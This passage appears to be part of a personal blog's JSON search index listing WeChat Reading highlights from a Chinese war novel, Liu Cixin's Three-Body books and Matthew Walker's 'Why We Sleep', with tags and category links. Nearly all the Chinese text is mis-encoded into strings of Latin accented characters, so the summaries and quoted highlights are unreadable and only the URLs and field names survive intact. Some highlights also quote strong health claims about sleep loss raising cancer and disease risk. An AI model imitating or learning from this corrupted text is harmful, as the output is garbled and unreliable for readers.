æŠ—æˆ˜æ±‡èšäºæ­¤ï¼šåŒ—å¹³äººå­Ÿçƒ¦äº†ã€å†›åŒ»éƒå…½åŒ»ã€æ¹–å—å…µä¸è¾£ã€ä¸Šæµ·å†›å®˜é˜¿è¯‘ã€ä¸œåŒ—ä½¬è¿·é¾™è¿˜æœ‰å·å†›å£«å…µè±†é¥¼åŠè¦éº»ã€è›‡å±è‚¡ã€åº·ä¸«ã€å·å¦¹å­å°é†‰ç­‰ã€‚æ®‹é…·çš„æˆ˜äº‰è®©åˆ«æ— é€‰æ‹©çš„ä»–ä»¬æ‘’å¼ƒå‰ä»‡ã€æ©æ€¨ã€åè§ã€ç‹­éš˜è€Œç»„æˆä¸€æ”¯å°åˆ†é˜Ÿï¼Œç”¨è¡€è‚‰ä¹‹èº¯ä¹¦å†™äº†ä¸€æ›²é“è¡€å«å›½çš„æ‚²å£®æˆ˜æ­Œï¼æœ¬ä¹¦ä»ç‹¬ç‰¹çš„è§’åº¦å±•ç°äº†æŠ—æˆ˜æƒ¨çƒˆæ®‹é…·ã€è‰°è‹¦å“ç»çš„å›¾æ™¯ï¼Œå…·æœ‰æ— ä¸ä¼¦æ¯”çš„å†å²çœŸå®åº¦ã€‚ æˆ‘çš„å›¢é•¿æˆ‘çš„å›¢ï¼ˆæ®µå¥•å®ã€å¼ è¯‘ç­‰äººä¸»æ¼”ï¼‰ + ã€Šæˆ‘çš„å›¢é•¿æˆ‘çš„å›¢ï¼ˆæ®µå¥•å®ã€å¼ è¯‘ç­‰äººä¸»æ¼”ï¼‰ã€‹ å±æ€§ å†…å®¹ ISBN 9787020123469 ä½œè€… å…°æ™“é¾™ å‡ºç‰ˆå¹´ 2018-02-27 å‡ºç‰ˆç¤¾ äººæ°‘æ–‡å­¦å‡ºç‰ˆç¤¾ æ¥æº æˆ‘çš„å›¢é•¿æˆ‘çš„å›¢ï¼ˆæ®µå¥•å®ã€å¼ è¯‘ç­‰äººä¸»æ¼”ï¼‰ åˆ†ç±» ç²¾å“å°è¯´-æˆ˜äº‰å†›æ—… é«˜äº®åˆ’çº¿ ç¬¬ä¸€ç«  ç¬¬ä¸€ç«  æˆ‘æ˜¯æ–‡åŒ–äººï¼Œæˆ‘è®¤ä¸ºè¿™ç§è¾©è®ºæœ‰ç‚¹å„¿æ— èŠã€‚æˆ‘ç»å¸¸è®¤ä¸ºåˆ«äººå¾ˆæ— èŠï¼Œè€Œæˆ‘è‡ªå·±æ›´æ— èŠ â€” åˆ›å»ºäº [[2021-08-25]] 00:44 ^53-821-858 ç¬¬ä¸€ç«  æºƒå†›ä¸å¦‚å¯‡ï¼Œæµå…µå³ä¸ºè´¼ã€‚ â€” åˆ›å»ºäº [[2021-08-25]] 00:45 ^53-4649-4661 ç¬¬ä¸€ç«  åˆ«æ ‘å¤ªé«˜çš„ç†æƒ³ï¼Œé‚£å«ç»™è‡ªå·±æŒ–å‘ã€‚ â€” åˆ›å»ºäº [[2021-08-25]] 00:45 ^53-13075-13091 ç¬¬ä¸€ç«  è¿™æ ·ä¸€ä¸ªäº’ç›¸ç‹ å’¬çš„ä¸–ç•Œè®©æˆ‘å¾ˆæƒ³å°–é…¸å’Œåˆ»è–„ã€‚ â€” åˆ›å»ºäº [[2021-08-25]] 00:46 ^53-25377-25398 ç¬¬å››ç«  ç¬¬å››ç«  æ¬²è¨€å›½ä¹‹è€å°‘ï¼Œå…ˆè¨€äººä¹‹è€å°‘ã€‚è€æ€æ—¢å¾€å°‘æ€å°†æ¥ï¼Œæ€æ—¢å¾€æ•…ç”Ÿç•™æ‹ï¼Œæ€å°†æ¥æ•…ç”Ÿå¸Œæœ›ã€‚ â€” åˆ›å»ºäº [[2021-08-25]] 00:47 ^56-17524-17563","tags":[{"name":"weread","slug":"weread","permalink":"https://hodlyounger.github.io/tags/weread/"},{"name":"å¾®ä¿¡è¯»ä¹¦","slug":"å¾®ä¿¡è¯»ä¹¦","permalink":"https://hodlyounger.github.io/tags/%E5%BE%AE%E4%BF%A1%E8%AF%BB%E4%B9%A6/"}],"categories":[{"name":"D_ç«‹å¿—åšè§ˆç¾¤ä¹¦","slug":"D-ç«‹å¿—åšè§ˆç¾¤ä¹¦","permalink":"https://hodlyounger.github.io/categories/D-%E7%AB%8B%E5%BF%97%E5%8D%9A%E8%A7%88%E7%BE%A4%E4%B9%A6/"},{"name":"weread","slug":"D-ç«‹å¿—åšè§ˆç¾¤ä¹¦/weread","permalink":"https://hodlyounger.github.io/categories/D-%E7%AB%8B%E5%BF%97%E5%8D%9A%E8%A7%88%E7%BE%A4%E4%B9%A6/weread/"},{"name":"ç²¾å“å°è¯´","slug":"D-ç«‹å¿—åšè§ˆç¾¤ä¹¦/weread/ç²¾å“å°è¯´","permalink":"https://hodlyounger.github.io/categories/D-%E7%AB%8B%E5%BF%97%E5%8D%9A%E8%A7%88%E7%BE%A4%E4%B9%A6/weread/%E7%B2%BE%E5%93%81%E5%B0%8F%E8%AF%B4/"}]},{"title":"åˆ˜æ…ˆæ¬£ä¸‰å¤§é•¿ç¯‡ä»£è¡¨ä½œï¼ˆã€Šä¸‰ä½“ã€‹ã€ŠçƒçŠ¶é—ªç”µã€‹ã€Šè¶…æ–°æ˜Ÿçºªå…ƒã€‹ï¼‰","date":"2024-08-31T01:35:29.353Z","path":"D_ç«‹å¿—åšè§ˆç¾¤ä¹¦/weread/ç²¾å“å°è¯´/åˆ˜æ…ˆæ¬£ä¸‰å¤§é•¿ç¯‡ä»£è¡¨ä½œï¼ˆã€Šä¸‰ä½“ã€‹ã€ŠçƒçŠ¶é—ªç”µã€‹ã€Šè¶…æ–°æ˜Ÿçºªå…ƒã€‹ï¼‰-åˆ˜æ…ˆæ¬£/","text":"ä½œè€…ï¼šåˆ˜æ…ˆæ¬£ - å†…å®¹ç®€ä»‹ ã€Šåˆ˜æ…ˆæ¬£ä¸‰å¤§é•¿ç¯‡ä»£è¡¨ä½œï¼ˆã€Šä¸‰ä½“ã€‹ã€ŠçƒçŠ¶é—ªç”µã€‹ã€Šè¶…æ–°æ˜Ÿçºªå…ƒã€‹ï¼‰ã€‹ åˆ˜æ…ˆæ¬£ä¸‰å¤§é•¿ç¯‡ä»£è¡¨ä½œï¼Œè´¯ç©¿åˆ˜æ…ˆæ¬£çš„åˆ›ä½œç”Ÿæ¶¯ï¼Œä»£è¡¨äº†å¯¹å®‡å®™å’Œäººç”Ÿçš„ç»ˆææ€è€ƒï¼ã€Šä¸‰ä½“ã€‹ï¼å¾æœä¸–ç•Œçš„ä¸­å›½ç§‘å¹»ç¥ä½œï¼â€œé›¨æœå¥–â€â€œæ˜Ÿäº‘å¥–â€â€œè½¨è¿¹å¥–â€æœ€ä½³é•¿ç¯‡å°è¯´ï¼ã€Šä¸‰ä½“å‰ä¼ ï¼šçƒçŠ¶é—ªç”µã€‹ï¼åˆ˜æ…ˆæ¬£å†™ä½œé£æ ¼çš„å¥ åŸºä¹‹ä½œï¼Œä»£è¡¨åˆ˜æ…ˆæ¬£å¯¹äººç”Ÿçš„ç»ˆææ€è€ƒï¼ã€Šè¶…æ–°æ˜Ÿçºªå…ƒã€‹ï¼åˆ˜æ…ˆæ¬£çš„é•¿ç¯‡å¤„å¥³ä½œï¼å‰åå†æ—¶åäºŒå¹´ï¼Œäº”æ˜“å…¶ç¨¿ï¼åˆ˜æ…ˆæ¬£ä¸‰å¤§é•¿ç¯‡å±•ç°æœ€ç‹‚é‡çš„æƒ³è±¡åŠ›ï¼å¸¦ä½ ä»å¦ä¸€ä¸ªç»´åº¦è§‚å¯Ÿä¸–ç•Œï¼ä¸‰å¤§é•¿ç¯‡è”è¢‚èµ°å‡ºå›½é—¨ï¼ã€Šä¸‰ä½“ã€‹å·²å‡ºç‰ˆ16ä¸ªè¯­ç§ï¼Œæ¨ªæ‰«30å›½è¯»è€…ï¼å¥¥å·´é©¬ï¼šâ€œä¸‰ä½“å¤ªæœ‰æƒ³è±¡åŠ›äº†ï¼ŒèƒŒæ™¯ååˆ†å®å¤§ã€‚æ‹¥æœ‰ç‹‚é‡çš„æƒ³è±¡åŠ›ï¼Œéå¸¸æœ‰è¶£ã€‚â€è«è¨€ï¼šâ€œåˆ˜æ…ˆæ¬£åˆ©ç”¨æ·±åšçš„ç§‘å­¦çŸ¥è¯†ä½œä¸ºæƒ³è±¡åŠ›çš„åŸºç¡€ï¼ŒæŠŠäººé—´çš„ç”Ÿæ´»ã€æƒ³è±¡çš„ç”Ÿæ´»èåˆåœ¨ä¸€èµ·ï¼Œäº§ç”Ÿäº†ç‹¬ç‰¹çš„è¶£å‘³ã€‚â€è¦äº†è§£åˆ˜æ…ˆæ¬£ï¼Œå…ˆä»ä¸‰å¤§é•¿ç¯‡ä»£è¡¨ä½œå¼€å§‹ï¼ åˆ˜æ…ˆæ¬£ä¸‰å¤§é•¿ç¯‡ä»£è¡¨ä½œï¼ˆã€Šä¸‰ä½“ã€‹ã€ŠçƒçŠ¶é—ªç”µã€‹ã€Šè¶…æ–°æ˜Ÿçºªå…ƒã€‹ï¼‰ + ã€Šåˆ˜æ…ˆæ¬£ä¸‰å¤§é•¿ç¯‡ä»£è¡¨ä½œï¼ˆã€Šä¸‰ä½“ã€‹ã€ŠçƒçŠ¶é—ªç”µã€‹ã€Šè¶…æ–°æ˜Ÿçºªå…ƒã€‹ï¼‰ã€‹ å±æ€§ å†…å®¹ ISBN null ä½œè€… åˆ˜æ…ˆæ¬£ å‡ºç‰ˆå¹´ 2019-07-01 å‡ºç‰ˆç¤¾ è¯»å®¢æ–‡åŒ–è‚¡ä»½æœ‰é™å…¬å¸ æ¥æº åˆ˜æ…ˆæ¬£ä¸‰å¤§é•¿ç¯‡ä»£è¡¨ä½œï¼ˆã€Šä¸‰ä½“ã€‹ã€ŠçƒçŠ¶é—ªç”µã€‹ã€Šè¶…æ–°æ˜Ÿçºªå…ƒã€‹ï¼‰ åˆ†ç±» ç²¾å“å°è¯´-ç§‘å¹»å°è¯´ é«˜äº®åˆ’çº¿ ã€å±æœºçºªå…ƒ5-7å¹´ï¼Œé˜¶æ¢¯è®¡åˆ’ã€‘ ã€å±æœºçºªå…ƒ5-7å¹´ï¼Œé˜¶æ¢¯è®¡åˆ’ã€‘ ä½†åŒæ—¶å¥¹ä¹Ÿç¬¬ä¸€æ¬¡çŸ¥é“ï¼Œé‚£äº›äººå°±æ˜¯å¿µå¨ç€è¿™æ ·çš„è¯æŠŠå¦ˆå–ç»™å¦“é™¢çš„ã€‚ â€” åˆ›å»ºäº [[2023-01-03]] 22:52 ^210-2163-2194 ã€å¨æ…‘çºªå…ƒ61å¹´ï¼Œæ‰§å‰‘äººã€‘ ã€å¨æ…‘çºªå…ƒ61å¹´ï¼Œæ‰§å‰‘äººã€‘ ä¸è¿‡ï¼Œåœ¨è¿™ä¸ªæ—¶ä»£ï¼Œè‰¯å¿ƒå’Œè´£ä»»å¯ä¸æ˜¯è¤’ä¹‰è¯ï¼Œè¿™ä¸¤ç§ä¸œè¥¿è¡¨ç°å¾—å¤ªå¤šä¼šè¢«è§†ä¸ºå¿ƒç†ç–¾ç—…ï¼Œå«ç¤¾ä¼šäººæ ¼å¼ºè¿«ç—‡ï¼Œè¦æ¥å—æ²»ç–—çš„ã€‚â€ â€” åˆ›å»ºäº [[2023-01-04]] 15:39 ^213-2081-2138 ã€å¨æ…‘çºªå…ƒ61å¹´ï¼Œæ‰§å‰‘äººã€‘ è¾¾æ‘©å…‹åˆ©æ–¯ä¹‹å‰‘ â€” åˆ›å»ºäº [[2023-01-04]] 23:07 ^213-9351-9358 ã€å¹¿æ’­çºªå…ƒ8å¹´ï¼Œå‘½è¿çš„æŠ‰æ‹©ã€‘ ã€å¹¿æ’­çºªå…ƒ8å¹´ï¼Œå‘½è¿çš„æŠ‰æ‹©ã€‘ ç°åœ¨çœ‹æ¥ï¼Œé»‘æš—æ£®æ—æ‰“å‡»åªæ‘§æ¯ä¸‰æ˜Ÿä¸­çš„ä¸€é¢—ï¼Œå¹¶ä¸ä»…ä»…æ˜¯ä¸ºäº†ç»æµï¼Œè¿˜æœ‰ç€æ›´æ¯’è¾£çš„ç›®çš„ã€‚åœ¨æ˜Ÿç³»ä¸­ä»å­˜åœ¨ä¸€è‡³ä¸¤é¢—æ’æ˜Ÿçš„æƒ…å†µä¸‹ï¼Œæ˜Ÿäº‘ç‰©è´¨ä¸æ–­è¢«æ’æ˜Ÿå¸å…¥ï¼Œè¿™ä¸ªè¿‡ç¨‹äº§ç”Ÿäº†å·¨é‡çš„å¼ºè¾å°„ï¼Œä½¿ç°åœ¨çš„ä¸‰ä½“æ˜Ÿç³»æˆä¸ºäº†è¾å°„çš„ç†”ç‚‰ï¼Œå¯¹ç”Ÿå‘½å’Œæ–‡æ˜æ¥è¯´æ˜¯ä¸€ä¸ªæ­»äº¡ä¹‹åŸŸã€‚ â€” åˆ›å»ºäº [[2023-01-10]] 00:13 ^228-19203-19321","tags":[{"name":"weread","slug":"weread","permalink":"https://hodlyounger.github.io/tags/weread/"},{"name":"å¾®ä¿¡è¯»ä¹¦","slug":"å¾®ä¿¡è¯»ä¹¦","permalink":"https://hodlyounger.github.io/tags/%E5%BE%AE%E4%BF%A1%E8%AF%BB%E4%B9%A6/"}],"categories":[{"name":"D_ç«‹å¿—åšè§ˆç¾¤ä¹¦","slug":"D-ç«‹å¿—åšè§ˆç¾¤ä¹¦","permalink":"https://hodlyounger.github.io/categories/D-%E7%AB%8B%E5%BF%97%E5%8D%9A%E8%A7%88%E7%BE%A4%E4%B9%A6/"},{"name":"weread","slug":"D-ç«‹å¿—åšè§ˆç¾¤ä¹¦/weread","permalink":"https://hodlyounger.github.io/categories/D-%E7%AB%8B%E5%BF%97%E5%8D%9A%E8%A7%88%E7%BE%A4%E4%B9%A6/weread/"},{"name":"ç²¾å“å°è¯´","slug":"D-ç«‹å¿—åšè§ˆç¾¤ä¹¦/weread/ç²¾å“å°è¯´","permalink":"https://hodlyounger.github.io/categories/D-%E7%AB%8B%E5%BF%97%E5%8D%9A%E8%A7%88%E7%BE%A4%E4%B9%A6/weread/%E7%B2%BE%E5%93%81%E5%B0%8F%E8%AF%B4/"}]},{"title":"ä¸‰ä½“ï¼ˆå…¨é›†ï¼‰","date":"2024-08-31T01:35:29.349Z","path":"D_ç«‹å¿—åšè§ˆç¾¤ä¹¦/weread/ç²¾å“å°è¯´/ä¸‰ä½“ï¼ˆå…¨é›†ï¼‰-åˆ˜æ…ˆæ¬£/","text":"ä½œè€…ï¼šåˆ˜æ…ˆæ¬£ - å†…å®¹ç®€ä»‹ ã€Šä¸‰ä½“ï¼ˆå…¨é›†ï¼‰ã€‹ æ¯ä¸ªäººçš„ä¹¦æ¶ä¸Šéƒ½è¯¥æœ‰å¥—ã€Šä¸‰ä½“ã€‹ï¼å…³äºå®‡å®™æœ€ç‹‚é‡çš„æƒ³è±¡ï¼å°±æ˜¯å®ƒï¼å¾æœä¸–ç•Œçš„ä¸­å›½ç§‘å¹»ç¥ä½œï¼åŒ…æ½ä¹é¡¹ä¸–ç•Œé¡¶çº§ç§‘å¹»å¤§å¥–ï¼å‡ºç‰ˆ16ä¸ªè¯­ç§ï¼Œæ¨ªæ‰«30å›½è¯»è€…ï¼å¥¥å·´é©¬ã€é›·å†›ã€é©¬åŒ–è…¾ã€å‘¨é¸¿è¢†ã€æ½˜çŸ³å±¹ã€æ‰å…‹ä¼¯æ ¼â€¦â€¦å¼ºæ¨ï¼åˆ˜æ…ˆæ¬£è·å¾—2018å¹´åº¦å…‹æ‹‰å…‹æƒ³è±¡åŠ›è´¡çŒ®ç¤¾ä¼šå¥–ï¼åˆ˜æ…ˆæ¬£æ˜¯ä¸­å›½ç§‘å¹»å°è¯´çš„æœ€ä¸»è¦ä»£è¡¨ä½œå®¶ï¼Œäºšæ´²é¦–ä½ä¸–ç•Œç§‘å¹»å¤§å¥–â€œé›¨æœå¥–â€å¾—ä¸»ï¼Œè¢«èª‰ä¸ºä¸­å›½ç§‘å¹»çš„é¢†å†›äººç‰©ã€‚ ä¸‰ä½“ï¼ˆå…¨é›†ï¼‰ + ã€Šä¸‰ä½“ï¼ˆå…¨é›†ï¼‰ã€‹ å±æ€§ å†…å®¹ ISBN 9785214589626 ä½œè€… åˆ˜æ…ˆæ¬£ å‡ºç‰ˆå¹´ 2018-12-01 å‡ºç‰ˆç¤¾ æµ·å—çœç”µå­éŸ³åƒå‡ºç‰ˆç¤¾ æ¥æº ä¸‰ä½“ï¼ˆå…¨é›†ï¼‰ åˆ†ç±» ç²¾å“å°è¯´-ç§‘å¹»å°è¯´ é«˜äº®åˆ’çº¿ ä¸Šéƒ¨ é¢å£è€… ä¸Šéƒ¨ é¢å£è€… â€œæ£€æµ‹åˆ°çš„æ‰€æœ‰é«˜èƒ½æ’å‡»äº‹ä»¶ï¼ŒåŒ…æ‹¬åœ¨ä¸Šä¸–çºªå°±æœ‰ç¡®å®šç»“æœçš„é‚£äº›æ’å‡»ç±»å‹ï¼Œç»“æœéƒ½å‘ˆç°å‡ºå®Œå…¨çš„æ··ä¹±ã€‚â€ â€œä¹Ÿå°±æ˜¯è¯´ï¼Œæ™ºå­ç°åœ¨å·²ç»èƒ½å¤ŸåŒæ—¶å¹²æ‰°ä¸Šç™¾å°åŠ é€Ÿå™¨ã€‚â€ â€œä¹Ÿè®¸æˆ‘ä»¬å†å»ºç«‹ä¸Šä¸‡ä¸ªæ£€æµ‹ç‚¹ï¼Œå®ƒä»¬ä¹Ÿéƒ½èƒ½å¹²æ‰°ï¼Œæ‰€ä»¥ï¼Œç°åœ¨å¤ªé˜³ç³»ä¸­çš„æ™ºå­æ•°é‡è¿œä¸æ­¢ä¸¤ä¸ªäº†ã€‚â€ â€œå“¦â€”â€”â€æ³°å‹’æŠ¬å¤´ä»°æœ›é•¿ç©ºï¼Œä¸€æ—¶è¯´ä¸å‡ºè¯æ¥ã€‚è¯´ä»€ä¹ˆå‘¢ï¼Ÿè¯´ä»€ä¹ˆå®ƒä»¬éƒ½åœ¨å¬ç€ï¼Œå®ƒä»¬æ­£æºæºä¸æ–­åœ°åˆ°æ¥ï¼Œå¾®è§‚çš„çœ¼ç›æ— å¤„ä¸åœ¨ï¼Œç°åœ¨è‚¯å®šå°±é£˜æµ®åœ¨å‘¨å›´ï¼Œä»–çš„è¯åœ¨è¯´ç»™ä¸ä»ªæ—¶ä¹Ÿæ˜¯åœ¨å¯¹å››å…‰å¹´å¤–çš„ä¸‰ä½“äººè¯´ï¼Œä¸€æ—¶é—´ï¼Œä»–çœŸæƒ³ç›´æ¥å¯¹ä¸‰ä½“äººè¯´è¯äº†ã€‚ â€œä¸è¿‡è¿™ä¹Ÿæ­£å¥½è¯æ˜äº†é¢å£è®¡åˆ’çš„å¿…è¦æ€§ã€‚â€ä¸ä»ªè¯´ã€‚ å‹¤åŠ¡è½¦å¼€èµ°åï¼Œæ³°å‹’ä¸€äººåœ¨è·‘é“è¾¹ä¸Šç«™äº†å¾ˆä¹…ï¼Œçœ‹ç€â€œäº”æœˆèŠ±â€å·è¢«æ‹–å‘æœºåº“ã€‚å…¶å®ä»–ä»€ä¹ˆéƒ½æ²¡çœ‹åˆ°ï¼Œåªæ˜¯æƒ³ç€å¦ä¸€ä¸ªä»¥å‰å¿½ç•¥äº†çš„å±é™©ï¼šç°åœ¨è¦æ‰¾çš„ä¸æ˜¯ç‰©ç†å­¦å®¶ï¼Œè€Œæ˜¯åŒ»ç”Ÿæˆ–å¿ƒç†å­¦å®¶ï¼Œè¿˜æœ‰é‚£äº›ç ”ç©¶ç¡çœ çš„ä¸“å®¶ã€‚ æ€»ä¹‹ï¼Œæ‰¾é‚£äº›èƒ½è®©è‡ªå·±ä¸è¯´æ¢¦è¯çš„äººã€‚ å±±æ‰æƒ å­åœ¨æ·±å¤œé†’æ¥ï¼Œå‘ç°èº«è¾¹ç©ºç€ï¼Œè€Œä¸”é‚£é‡Œçš„åºŠå•å·²ç»æ˜¯å‡‰çš„ã€‚å¥¹èµ·èº«æŠ«è¡£èµ°å‡ºæˆ¿é—¨ï¼Œå’Œå¾€å¸¸ä¸€æ ·ï¼Œä¸€çœ¼å°±åœ¨é™¢å­é‡Œçš„ç«¹æ—ä¸­çœ‹åˆ°äº†ä¸ˆå¤«çš„èº«å½±ã€‚ä»–ä»¬åœ¨è‹±å›½å’Œæ—¥æœ¬å„æœ‰ä¸€å¥—æˆ¿å­ï¼Œä½†å¸Œæ©æ–¯è¿˜æ˜¯å–œæ¬¢æ—¥æœ¬çš„å®¶ï¼Œä»–è¯´ä¸œæ–¹çš„æœˆå…‰èƒ½è®©ä»–çš„å¿ƒå®é™ä¸‹æ¥ã€‚ä»Šå¤œæ²¡æœ‰æœˆå…‰ï¼Œç«¹æ—å’Œå¸Œæ©æ–¯çš„èº«å½±éƒ½å¤±å»äº†ç«‹ä½“æ„Ÿï¼Œåƒä¸€å¼ æŒ‚åœ¨æ˜Ÿå…‰ä¸‹çš„é»‘è‰²å‰ªçº¸ç”»ã€‚ â€” åˆ›å»ºäº [[2021-06-08]] 22:13 ^44-108099","tags":[{"name":"weread","slug":"weread","permalink":"https://hodlyounger.github.io/tags/weread/"},{"name":"å¾®ä¿¡è¯»ä¹¦","slug":"å¾®ä¿¡è¯»ä¹¦","permalink":"https://hodlyounger.github.io/tags/%E5%BE%AE%E4%BF%A1%E8%AF%BB%E4%B9%A6/"}],"categories":[{"name":"D_ç«‹å¿—åšè§ˆç¾¤ä¹¦","slug":"D-ç«‹å¿—åšè§ˆç¾¤ä¹¦","permalink":"https://hodlyounger.github.io/categories/D-%E7%AB%8B%E5%BF%97%E5%8D%9A%E8%A7%88%E7%BE%A4%E4%B9%A6/"},{"name":"weread","slug":"D-ç«‹å¿—åšè§ˆç¾¤ä¹¦/weread","permalink":"https://hodlyounger.github.io/categories/D-%E7%AB%8B%E5%BF%97%E5%8D%9A%E8%A7%88%E7%BE%A4%E4%B9%A6/weread/"},{"name":"ç²¾å“å°è¯´","slug":"D-ç«‹å¿—åšè§ˆç¾¤ä¹¦/weread/ç²¾å“å°è¯´","permalink":"https://hodlyounger.github.io/categories/D-%E7%AB%8B%E5%BF%97%E5%8D%9A%E8%A7%88%E7%BE%A4%E4%B9%A6/weread/%E7%B2%BE%E5%93%81%E5%B0%8F%E8%AF%B4/"}]},{"title":"æˆ‘ä»¬ä¸ºä»€ä¹ˆè¦ç¡è§‰ï¼Ÿ","date":"2024-08-31T01:35:29.346Z","path":"D_ç«‹å¿—åšè§ˆç¾¤ä¹¦/weread/ç§‘å­¦æŠ€æœ¯/æˆ‘ä»¬ä¸ºä»€ä¹ˆè¦ç¡è§‰ï¼Ÿ-é©¬ä¿®Â·æ²ƒå…‹/","text":"ä½œè€…ï¼šé©¬ä¿®Â·æ²ƒå…‹ - å†…å®¹ç®€ä»‹ ã€Šæˆ‘ä»¬ä¸ºä»€ä¹ˆè¦ç¡è§‰ï¼Ÿã€‹ ä½ è®¤ä¸ºè‡ªå·±æœ€è¿‘ç¡çœ å……è¶³å—ï¼Ÿä½ è¿˜è®°å¾—ä¸Šä¸€æ¬¡è‡ªç„¶é†’åç¥æ¸…æ°”çˆ½çš„æ„Ÿè§‰å—ï¼Ÿä¸ç”¨æ€€ç–‘ï¼Œæˆ‘ä»¬æ­£åœ¨è¿›å…¥ä¸€ä¸ªå¤±çœ å·²ç»æˆä¸ºæµè¡Œç—…çš„æ—¶ä»£ã€‚ä½œä¸ºä¸€åæ°å‡ºçš„ç¥ç»ç§‘å­¦å®¶ï¼Œæ²ƒå…‹å¯¹ç”Ÿç‰©çš„ç¡çœ è¡Œä¸ºå……æ»¡å¥½å¥‡ï¼Œè¿™ä¿ƒä½¿ä»–æˆäº†ç¡çœ ç ”ç©¶æ–¹é¢çš„ä¸“å®¶ã€‚æœ¬ä¹¦ä¸­ï¼Œä»–æ€»ç»“äº†äººç±»æœ‰å²ä»¥æ¥çš„ç¡çœ ç ”ç©¶æˆæœï¼Œä»¥åŠå‰æ²¿çš„ç§‘å­¦çªç ´ï¼Œå‘Šè¯‰æˆ‘ä»¬ç¡çœ çš„è¿è¡Œæœºåˆ¶ã€ç¡çœ ä¸è¶³çš„åå¤„ã€ç¡çœ ä¸åšæ¢¦çš„æœ‰ç›ŠåŠŸèƒ½ï¼Œä»¥åŠç¡çœ å¯¹ä¸“ä¸šäººå£«ä¸ªäººèƒ½åŠ›æå‡çš„æƒŠäººå½±å“ã€‚æˆ‘ä»¬çš„èº«ä½“å¥åº·ã€å¿ƒç†å¥åº·ã€æƒ…å•†æ™ºå•†ã€è®°å¿†åŠ›ã€è¿åŠ¨åŠ›ã€å­¦ä¹ åŠ›ã€ç”Ÿäº§åŠ›ã€åˆ›é€ åŠ›ã€å¸å¼•åŠ›ï¼Œç”šè‡³é£Ÿæ¬²ï¼Œè¿™äº›è®©æ—¥é—´ç”Ÿæ´»ä¸°å¯Œå¤šå½©çš„èƒ½åŠ›ï¼ŒåŸæ¥éƒ½ä¸å¤œé—´é‚£åœºç¡çœ æœ‰ç€å¯†ä¸å¯åˆ†çš„å…³ç³»ã€‚ç°åœ¨ï¼Œä½ çŸ¥é“æˆ‘ä»¬ä¸ºä»€ä¹ˆéœ€è¦å……è¶³çš„ç¡çœ äº†å§ã€‚æ‰“å¼€è¿™æœ¬ä¹¦ï¼Œçœ‹å¹³å‡¡çš„ç¡çœ å¦‚ä½•å¸¦æ¥éå‡¡çš„ç”Ÿå‘½èƒ½é‡ï¼Œé¡¶å°–ç§‘å­¦å¯¹äºç¡çœ çš„æ‰€æœ‰äº†è§£åŠå¦‚ä½•ç¡å¥½è§‰çš„è¯€çªéƒ½å°†åœ¨è¿™éƒ¨å…³äºç¡çœ çš„â€œç™¾ç§‘å…¨ä¹¦â€ä¸­é€ä¸€æ­æ™“ã€‚ æˆ‘ä»¬ä¸ºä»€ä¹ˆè¦ç¡è§‰ï¼Ÿ + ã€Šæˆ‘ä»¬ä¸ºä»€ä¹ˆè¦ç¡è§‰ï¼Ÿã€‹ å±æ€§ å†…å®¹ ISBN 9787559648600 ä½œè€… é©¬ä¿®Â·æ²ƒå…‹ å‡ºç‰ˆå¹´ 2021-03-01 å‡ºç‰ˆç¤¾ åŒ—äº¬è”åˆå‡ºç‰ˆå…¬å¸ æ¥æº æˆ‘ä»¬ä¸ºä»€ä¹ˆè¦ç¡è§‰ï¼Ÿ åˆ†ç±» ç§‘å­¦æŠ€æœ¯-ç§‘å­¦ç§‘æ™® é«˜äº®åˆ’çº¿ 01 ç¡å§â€¦â€¦ 01 ç¡å§â€¦â€¦ æ¯æ™šçš„è§„å¾‹ç¡çœ å°‘äº6~7ä¸ªå°æ—¶ä¼šç ´åä½ çš„å…ç–«ç³»ç»Ÿï¼Œç½¹æ‚£ç™Œç—‡çš„é£é™©å°†å¢åŠ ä¸€å€ä»¥ä¸Šã€‚ç¡çœ ä¸è¶³ä¹Ÿæ˜¯å†³å®šä½ æ˜¯å¦ä¼šæ‚£ä¸Šé˜¿å°”èŒ¨æµ·é»˜ç—…çš„ä¸€ä¸ªå…³é”®ç”Ÿæ´»æ–¹å¼å› ç´ ã€‚ â€” åˆ›å»ºäº [[2022-04-28]] 08:30 ^36-771-843 01 ç¡å§â€¦â€¦ ç¡çœ ä¸è¶³â€”â€”å“ªæ€•åªæ˜¯ä¸€ä¸ªæ˜ŸæœŸçš„é€‚åº¦å‡å°‘â€”â€”ä¹Ÿæœ‰å¯èƒ½ä¸¥é‡å½±å“è¡€ç³–æ°´å¹³ï¼Œä½¿ä½ è·¨å…¥ç³–å°¿ç—…å‰æœŸæ‚£è€…çš„è¡Œåˆ—ã€‚ç¼ºä¹ç¡çœ è¿˜ä¼šå¢åŠ å† çŠ¶åŠ¨è„‰å µå¡ã€å˜è–„çš„é£é™©ï¼Œä½¿ä½ å—åˆ°å¿ƒè¡€ç®¡ç–¾ç—…ã€ä¸­é£å’Œå……è¡€æ€§å¿ƒåŠ›è¡°ç«­çš„å¨èƒ â€” åˆ›å»ºäº [[2022-04-28]] 08:30 ^36-843-936 01 ç¡å§â€¦â€¦ ç¡çœ å‰¥å¤ºè¿™æ ¹æ©¡çš®ç­‹åœ¨å´©æ–­ä¹‹å‰ï¼Œèƒ½å¤Ÿæ‰¿å—çš„æ‹‰åŠ›æ˜¯æœ‰é™çš„ï¼Œç„¶è€Œå¯æ‚²çš„æ˜¯ï¼Œäººç±»å®é™…ä¸Šæ˜¯å”¯ä¸€ä¸€ç§ä¼šåœ¨æ²¡æœ‰åˆç†ç›Šå¤„çš„æƒ…å†µä¸‹æ•…æ„å‰¥å¤ºè‡ªå·±ç¡çœ çš„ç‰©ç§ã€‚ â€” åˆ›å»ºäº [[2022-04-28]] 08:38 ^36-1393-1461 01 ç¡å§â€¦â€¦ ç¡çœ æ˜¯å¥åº·ä¸‰è¦ç´ ï¼ˆç¡çœ ã€é¥®é£Ÿã€è¿åŠ¨ï¼‰ä¸­æœ€é‡è¦çš„ã€‚ â€” åˆ›å»ºäº [[2022-04-28]] 21:19 ^36-5065-5089 01 ç¡å§â€¦â€¦ è¦æƒ³ä½¿æˆ‘ä»¬çš„å¤§è„‘å’Œèº«ä½“å¥åº·æ¢å¤åˆ°æ¯å¤©çš„æœ€ä½³çŠ¶æ€ï¼Œæˆ‘ä»¬å”¯ä¸€èƒ½åšçš„ä¹Ÿæ˜¯æœ€æœ‰æ•ˆçš„äº‹ï¼Œå°±æ˜¯ç¡è§‰ï¼Œå®ƒæ˜¯å¤§è‡ªç„¶èµäºˆæˆ‘ä»¬çš„å¯¹æŠ—æ­»äº¡çš„æœ€ä½³åŠæ³•ã€‚ â€” åˆ›å»ºäº [[2022-04-28]] 21:20 ^36-5391-5455 